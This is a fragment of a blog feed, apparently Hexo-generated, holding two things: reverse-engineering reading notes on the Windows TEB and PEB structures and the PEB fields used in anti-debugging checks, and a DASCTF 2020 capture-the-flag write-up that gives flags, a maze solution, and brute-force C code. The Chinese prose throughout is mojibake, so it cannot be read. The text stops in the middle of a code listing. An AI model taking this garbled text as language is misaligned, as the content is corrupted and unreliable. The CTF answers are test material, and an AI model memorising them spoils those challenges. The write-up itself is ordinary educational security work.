title="FSæ®µå¯„å­˜å™¨"></a>FSæ®µå¯„å­˜å™¨</h3><p>FSæ®µå¯„å­˜å™¨ç”¨æ¥æŒ‡ç¤ºå½“å‰çº¿ç¨‹çš„TEBç»“æ„ä½“ã€‚å®é™…ä¸Šï¼ŒFSå¯„å­˜å™¨å¹¶éç›´æ¥æŒ‡å‘TEBç»“æ„ä½“çš„åœ°å€ï¼Œå®ƒæŒæœ‰SDTçš„ç´¢å¼•ï¼Œè€Œè¯¥ç´¢å¼•æŒæœ‰å®é™…çš„TEBåœ°å€ã€‚</p><blockquote><p>SDTä½äºå†…æ ¸å†…å­˜åŒºåŸŸï¼Œå…¶åœ°å€å­˜å‚¨åœ¨ç‰¹æ®Šçš„å¯„å­˜å™¨GDTR(å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨)ä¸­ã€‚</p></blockquote><p>ä¸Šè¿°ç¤ºæ„å›¾ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717211000065.png" alt="image-20200717211000065"></p><p>ç”±äºæ®µå¯„å­˜å®é™…å­˜å‚¨çš„æ˜¯SDTçš„ç´¢å¼•ï¼Œæ‰€ä»¥å®ƒä¹Ÿè¢«ç§°ä¸ºâ€œæ®µé€‰æ‹©ç¬¦â€ï¼ŒTEBç»“æ„ä½“ä½äºFSæ®µé€‰æ‹©ç¬¦æ‰€æŒ‡çš„æ®µå†…å­˜çš„èµ·å§‹åœ°å€å¤„ã€‚</p><p>FS:[0x18] = TEBèµ·å§‹åœ°å€:</p><p><strong>FS:[0x18] = TEB.NtTib.Self = address of TIB = address of TEB = FS:0</strong></p><p>FS:[0x30] = PEBèµ·å§‹åœ°å€ï¼š</p><p><strong>FS:[0x30] = TEB.ProcessEnvironmentBlock = address of PEB</strong></p><p>FS:[0] = SEHèµ·å§‹åœ°å€ï¼š</p><p><strong>FS:[0] = TEB.NtTIb.ExceptionList = address of SEH</strong></p><hr><h2 id="ç¬¬å››åä¸ƒç« -PEB"><a href="#ç¬¬å››åä¸ƒç« -PEB" class="headerlink" title="ç¬¬å››åä¸ƒç«  PEB"></a>ç¬¬å››åä¸ƒç«  PEB</h2><h3 id="ä»‹ç»-8"><a href="#ä»‹ç»-8" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>PEBï¼šè¿›ç¨‹ç¯å¢ƒå—ï¼Œå­˜æ”¾è¿›ç¨‹ä¿¡æ¯çš„ç»“æ„ä½“ã€‚</p><p>TEBç»“æ„ä½“ä½äºFSæ®µé€‰æ‹©ç¬¦æ‰€æŒ‡çš„æ®µå†…å­˜çš„èµ·å§‹åœ°å€å¤„ï¼Œè€ŒProcessEnvironmentBlockæˆå‘˜ä½äºè·TEBç»“æ„ä½“Offset 30ä½ç½®ï¼Œæ‰€ä»¥ï¼šFS:[30] = TEB.ProcessEnvironmentBlock = address of PEB</p><p>è·å–PEBçš„ä¸¤ç§æ–¹æ³•ï¼š</p><blockquote><p><strong>1.ç›´æ¥è·å–PEBåœ°å€ï¼šmov eax, dword ptr fs:[30];    fs:[30] = address of PEB</strong></p><p><strong>2ã€‚å…ˆè·å–TEBåœ°å€ï¼Œå†é€šè¿‡ProcessEnvironmentBlockæˆå‘˜+30åç§»å¤„è·å–ï¼šmov eax, dword pte fs:[18]; mov eax, dword ptr ds:[eax+30]</strong></p></blockquote><p>PEBä¸­é‡è¦æˆå‘˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">002</span> BeingDebugged:UChar</span><br><span class="line">+<span class="number">008</span> ImageBaseAddress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c Ldr:Ptr32 _PEB_LDR_DATA</span><br><span class="line">+<span class="number">018</span> ProcessHeap:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">068</span> NtGlobalFlag:Uint4B</span><br></pre></td></tr></table></figure><h3 id="å®æ“-3"><a href="#å®æ“-3" class="headerlink" title="å®æ“"></a>å®æ“</h3><h4 id="PEB-BeingDebugged"><a href="#PEB-BeingDebugged" class="headerlink" title="PEB.BeingDebugged"></a>PEB.BeingDebugged</h4><p>Kernel32.dllä¸­çš„Kernel32!IsDebuggerPresentï¼ˆï¼‰API:è¯¥APIé€šè¿‡æ£€æŸ¥PEB.BeingDebuggedæˆå‘˜ç¡®å®šæ˜¯å¦æ­£åœ¨è°ƒè¯•è¿›ç¨‹ï¼ˆæ˜¯è¿”å›1ï¼Œå¦è¿”å›0ï¼‰ï¼š<code>Bool WINAPI IsDebuggerPresent(void);</code><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718102652664.png" alt="image-20200718102652664"></p><blockquote><p>Windows 7ä¸­ï¼ŒIsDebuggerPresent()APIæ˜¯åœ¨Kernelbase.dllä¸­å®ç°ã€‚è€Œåœ¨Windows XPåŠä»¥å‰çš„ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œå®ƒåœ¨Kernel32.dllä¸­å®ç°ã€‚</p></blockquote><h4 id="PEB-ImageBaseAddress"><a href="#PEB-ImageBaseAddress" class="headerlink" title="PEB.ImageBaseAddress"></a>PEB.ImageBaseAddress</h4><p>PEB.ImageBaseAddressæˆå‘˜ç”¨æ¥è¡¨ç¤ºè¿›ç¨‹çš„Imagebaseï¼šGetModuleHandle()APIç”¨æ¥è·å–ImageBase<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718103540596.png" alt="image-20200718103540596"></p><h4 id="PEB-Ldr"><a href="#PEB-Ldr" class="headerlink" title="PEB.Ldr"></a>PEB.Ldr</h4><p>PEB.Ldræˆå‘˜æ˜¯æŒ‡å‘_PEB_LDR_DATAç»“æ„ä½“çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">000</span> Length:Uint4B</span><br><span class="line">+<span class="number">004</span> Initialized:UChar</span><br><span class="line">+<span class="number">008</span> SsHandle:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c InLoadOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">014</span> InMemoryOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">01</span>c InInitializationOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">024</span> EntryInProgress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">028</span> ShutdownInProgress:UChar</span><br><span class="line">+<span class="number">02</span>c ShutdownThreadId:Ptr32 <span class="keyword">void</span></span><br></pre></td></tr></table></figure><blockquote><p>å½“æ¨¡å—ï¼ˆDLLï¼‰è¢«åŠ è½½åˆ°è¿›ç¨‹ï¼Œé€šè¿‡PEB.Ldræˆå‘˜å¯ä»¥ç›´æ¥è·å–è¯¥æ¨¡å—çš„åŠ è½½åŸºåœ°å€ã€‚</p></blockquote><p>_PEB_LDR_DATAç»“æ„ä½“æˆå‘˜ä¸­æœ‰3ä¸ª_LIST_ENTRYç±»å‹çš„æˆå‘˜ï¼ˆä¸Šé¢å·²æ ‡å‡ºï¼‰ï¼š<strong>_LIST_ENTRYç»“æ„ä½“æä¾›äº†åŒå‘é“¾è¡¨çš„æœºåˆ¶</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125;LIST_ENTRY, *PLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>è¯¥é“¾è¡¨ä¸­ä¿å­˜çš„ä¿¡æ¯ï¼š_LDR_DATA_TABLE_ENTRYç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PVOID Reserved[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserverd[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    Unicode_STRING FullDllName;</span><br><span class="line">    Byte Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><blockquote><p>æ¯ä¸ªåŠ è½½åˆ°è¿›ç¨‹ä¸­çš„DLLæ¨¡å—éƒ½æœ‰ä¸ä¹‹å¯¹åº”çš„_LDR_DATA_TABLE_ENTRYç»“æ„ä½“ï¼Œè¿™äº›ç»“æ„ä½“ç›¸äº’é“¾æ¥ï¼Œæœ€ç»ˆå½¢æˆ_LIST_ENTRYåŒå‘é“¾è¡¨ã€‚</p></blockquote><h4 id="PEB-ProcessHeap-amp-PEB-NtGlobalFlag"><a href="#PEB-ProcessHeap-amp-PEB-NtGlobalFlag" class="headerlink" title="PEB.ProcessHeap &amp; PEB.NtGlobalFlag"></a>PEB.ProcessHeap &amp; PEB.NtGlobalFlag</h4><p>PEB.ProcessHeapå’ŒPEB.NtGlobalFlagï¼ˆåƒPEB.BeingDebuggedä¸€æ ·ï¼‰åº”ç”¨äºåè°ƒè¯•ç»“æŸã€‚è‹¥è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€ï¼Œåˆ™ProcessHeapäºNtGlobalFlagæˆå‘˜å°±æŒæœ‰ç‰¹å®šå€¼ã€‚</p><hr>]]></content>
      
      
      <categories>
          
          <category> è¯»ä¹¦ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´DASCTFå…­æœˆçº¿ä¸Šèµ›</title>
      <link href="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>åªåšäº†4ä¸ªé€†å‘å’Œ1ä¸ªmiscã€‚ã€‚å› ä¸ºæ¯”è¾ƒæ™šæ‰å»å»åšï¼Œåªçœ‹äº†4ä¸ªï¼Œå¬è¯´è¿™æ¬¡é€†å‘éƒ½ä¸éš¾çš„ã€‚<a id="more"></a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><ul><li><p>64ä½elfæ–‡ä»¶åŠ äº†upxå£³ï¼Œè„±å£³åè½½å…¥idaä¸­å‘ç°ä¼ªä»£ç ä¸å¥½çœ‹ï¼Œå°±ç›´æ¥çœ‹æ±‡ç¼–ã€‚å°±ä¸‰ä¸ªæ£€æŸ¥å‡½æ•°ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626120857536.png" alt="image-20200626120857536"></p></li><li><p>chk1ï¼šå¯ä»¥çœ‹åˆ°ï¼Œåªè¦çŸ¥é“æ ˆä¸­<strong>rbp-20h</strong>çš„å†…å®¹å³å¯ã€‚è¿™é‡Œç›´æ¥çœ‹æˆ–è€…åŠ¨è°ƒéƒ½ç®€å•ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121531469.png" alt="image-20200626121531469"></p></li><li><p>chk2ï¼šä¸ch1åŒç†ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121844498.png" alt="image-20200626121844498"></p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626125833587-1593226438013.png" alt="image-20200626125833587"></p></li><li><p>chk3ï¼šä¸ä¸ŠåŒç†ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121936155.png" alt="image-20200626121936155"></p></li><li><p>æœ€åå°†å¾—åˆ°çš„æ•°æ®ç»“åˆèµ·æ¥å³å¯ï¼š<strong>c92bb6a5a6c3009124566d882d4bc7ee</strong></p></li></ul><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a>easy_maze</h3><ul><li><p>64ä½elfæ–‡ä»¶ï¼Œè½½å…¥idaä¸­çœ‹ä¸€ä¸‹ï¼ŒçŸ¥é“æ˜¯è¿·å®«é¢˜ï¼Œæ‰€ä»¥ç›®æ ‡æ˜¯æ˜ç¡®çš„ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141730876.png" alt="image-20200626141730876"></p></li><li><p>å¯ä»¥çŸ¥é“åˆšå¼€å§‹åˆ—å’Œè¡Œéƒ½æ˜¯0ï¼Œä¸‹é¢æ‰¾è¿·å®«å›¾ã€‚å…ˆéšä¾¿çœ‹ä¸€ä¸ªæ“ä½œå‡½æ•°ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141924284.png" alt="image-20200626141924284"></p></li><li><p>æŸ¥çœ‹byte_400AE0ï¼šæŠŠæ•°æ®æå–å‡ºæ¥ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142111607.png" alt="image-20200626142111607"></p></li><li><p>ç”¨Cè¯­è¨€å°†å›¾æ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, ida_chars[<span class="number">10</span>*i+j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142225682.png" alt="image-20200626142225682"></p></li><li><p>ç”±äº0å’ŒOä¸æ˜“åŒºåˆ«ï¼Œè‡ªå·±æŠŠ0æ¢æˆäº†1ã€‚æœ€åä»1ç»•è¿‡Oèµ°åˆ°#å³å¯ã€‚<strong>jkkjjhjjkjjkkkuukukkuuhhhuukkkk</strong> å†mad5åŠ å¯†ä¸€ä¸‹ã€‚</p></li></ul><h3 id="Magia"><a href="#Magia" class="headerlink" title="Magia"></a>Magia</h3><p>æ²¡çœ‹è§é¢˜ç›®çš„æç¤ºï¼Œåœ¨æ‰¾å¯†ç çš„æ—¶å€™æ‰€æœ‰æƒ…å†µè¯•çš„ã€‚ã€‚ã€‚</p><ul><li><p>32ä½PEæ–‡ä»¶ï¼Œé¦–å…ˆæ‰“å¼€çœ‹äº†ä¸‹ï¼Œ æç¤ºè¾“å…¥ä¸€ä¸ªå¯†ç ï¼Œç„¶åéªŒè¯ã€‚idaä¸­çœ‹çœ‹ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626205847063.png" alt="image-20200626205847063"></p></li><li><p>æ¥ç€çœ‹ä¸‹é¢ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210117361.png" alt="image-20200626210117361"></p></li><li><p>ç”¨é™åˆ¶æ¡ä»¶å†™çˆ†ç ´è¯•è¯•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, v5 = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">31</span>; i &gt; v5; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j &amp; <span class="number">0xf</span>) == v11[i])</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">33</span>; k &lt; <span class="number">127</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k &amp; <span class="number">0xf</span>) == v11[v5])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k^j) == v59[v5] &amp;&amp; (k&amp;j) == v43[v5])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j, flag[v5] = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210315055.png" alt="image-20200626210315055"></p></li><li><p>å¯ä»¥çœ‹åˆ°ï¼Œæƒ…å†µæ˜¯ä¸å”¯ä¸€çš„ï¼Œä¸ç„¶å¼€å§‹å°±ä¼šæ˜¯Nepäº†ã€‚å…ˆæ¥ç€å¾€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211038037.png" alt="image-20200626211038037"></p></li><li><p>å¼€å§‹æ‰¾é‡å†™çš„sub_403000()å‡½æ•°ã€‚å…ˆå¾—åˆ°key[14]çš„æ‰€æœ‰æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span 